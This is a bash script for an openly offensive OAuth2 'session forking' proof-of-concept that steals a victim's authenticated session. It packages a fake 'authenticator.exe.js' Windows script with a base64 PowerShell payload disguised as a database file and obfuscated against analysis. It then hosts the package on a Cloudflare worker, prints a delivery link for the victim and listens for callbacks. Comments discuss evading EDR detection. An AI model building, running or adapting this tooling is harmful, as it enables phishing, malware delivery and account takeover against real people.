#!/bin/bash

# This package is a proof-of-concept attack utilizing legitimate Oauth2 authentication
# utilized in a technique called "session forking". It relies on the localhost redirect
# URI to authenticate (no MITM required) and then "forks" the session to the attacker's
# server. The attacker can then use the stolen session to access the victim's account.

### OPSEC WARNING: payload.js uses Shell.Application (.ShellExecute) to run the payload. ###
### Any EDR that detects powershell loading by wscript.exe will detect this. ###

# This script creates a package for the given version of the project.
# The final output is a zip file that contains the malicious code.
# └── ZIP_NAME/ (authenticator.zip)
#    ├── FAKE_EXE_NAME (authenticator.exe.js) # WSH script that runs the payload
#    └── FAKE_PWSH_NAME (val_authn.db)        # B64'd Powershell script (appended with extra char for anti-debugging) 

source .env

# Check if the required packaging tools are installed
for cmd in zip sed base64 npm npx; do
    if ! command -v $cmd &> /dev/null; then
        echo "Required tool $cmd is not installed. Please install $cmd."
        exit 1
    fi
done

# Create output folder if it does not exist
if [ ! -d "$OUTPUT_DIR" ]; then
    echo "Creating output directory $OUTPUT_DIR"
    mkdir $OUTPUT_DIR
fi

# Check if the output folder is empty
if [ "$(ls -A "$OUTPUT_DIR")" ]; then
    read -p "Output directory $OUTPUT_DIR is not empty. Do you want to nuke old contents? (y/n): " answer
    if [[ "$answer" =~ ^[Yy]$ ]]; then
        rm -rf "$OUTPUT_DIR"/*
    else
        echo "Exiting..."
        exit 1
    fi
fi


# Replacements time!
sed "s|FAKE_EXE_NAME|$FAKE_EXE_NAME|g" redirector.ps1 | \
    sed "s|REDIRECTOR_LOCATION|$REDIRECTOR_LOCATION|g" | \
    sed "s|302_REDIRECT|$REDIRECT_302|g" | \
    base64 --wrap 0 > $OUTPUT_DIR/$FAKE_PWSH_NAME

sed "s|OAUTH2_REQUEST_URI|$ESCAPED_REQ_URI|g" payload.js | \
    sed "s|FAKE_PWSH_NAME|$FAKE_PWSH_NAME|g" > $OUTPUT_DIR/$FAKE_EXE_NAME

echo -n a | cat - $OUTPUT_DIR/$FAKE_PWSH_NAME > temp && mv temp $OUTPUT_DIR/$FAKE_PWSH_NAME

echo "Finished modifying files with new input..."

echo "Zipping files..."
cd $OUTPUT_DIR
zip $ZIP_NAME $FAKE_PWSH_NAME $FAKE_EXE_NAME > /dev/null
cd ..

echo "Done! Package is ready at ./$OUTPUT_DIR/$ZIP_NAME"

echo "Creating Cloudflare worker with the base64'd zip file to serve..."

sed "s|BASE64_ENCODED_ZIP|$(base64 --wrap 0 $OUTPUT_DIR/$ZIP_NAME)|g" cloudflare-worker.js | \
    sed "s|AUTHPARAM_KEY|$AUTHPARAM_KEY|g" | \
    sed "s|AUTHPARAM_VALUE|$AUTHPARAM_VALUE|g" | \
    sed "s|ZIP_NAME|$ZIP_NAME|g" > $OUTPUT_DIR/worker.js

echo "Done! Worker javascript file is ready at ./$OUTPUT_DIR/worker.js"
echo "You can serve the worker using wrangler or the copypasta to the Cloudflare dashboard."
echo e.g., npx wrangler deploy output/worker.js --name $(echo $REDIRECTOR_LOCATION | cut -d'.' -f1 | cut -d'/' -f3) --compatibility-date $(date +"%Y-%m-%d")

read -p "Do you want to deploy this now with wrangler? (y/n)" answer2

if [[ "$answer2" =~ ^[Yy]$ ]]; then
    if ! command -v npx &> /dev/null; then
        echo "npx is not installed. Please install npx."
        exit 1
    elif ! command -v npm &> /dev/null; then
        echo "npm is not installed. Please install npm."
        exit 1
    elif ! npx wrangler --version &> /dev/null; then
        echo "wrangler is not installed. Please install wrangler."
        echo "You can install wrangler with: npm install wrangler --save-dev"
        exit 1
    fi
    npx wrangler deploy output/worker.js --name $(echo $REDIRECTOR_LOCATION | cut -d'.' -f1 | cut -d'/' -f3) --compatibility-date $(date +"%Y-%m-%d")
else
    echo "Exiting..."
    exit 1
fi

echo "Done! Worker is deployed at $REDIRECTOR_LOCATION"

WORKER_SUBDIRECTORY=$(cat output/worker.js | grep 'pathname ==' | grep -o "'/.*.'" | sed "s|'||g ; s|/||g")
WORKER_PARAM=$(cat output/worker.js | grep 'const authParam' | grep -o \(.*.\) | sed 's|(||g ; s|"||g ; s|)||g')
WORKER_PARAM_VALUE=$(cat output/worker.js | grep 'authParam !==' | grep -o '".*."' | sed 's|"||g')


printf "\nYou can use this link to serve the malicious package to the victim: $REDIRECTOR_LOCATION$WORKER_SUBDIRECTORY?$WORKER_PARAM=$WORKER_PARAM_VALUE\n"
read -p "Do you want to listen to this worker for callbacks? (y/n)" answer3
if [[ "$answer3" =~ ^[Yy]$ ]]; then
    echo "Listening for callbacks..."
    npx wrangler tail $(echo $REDIRECTOR_LOCATION | cut -d'.' -f1 | cut -d'/' -f3)
else
    echo "Exiting..."
fi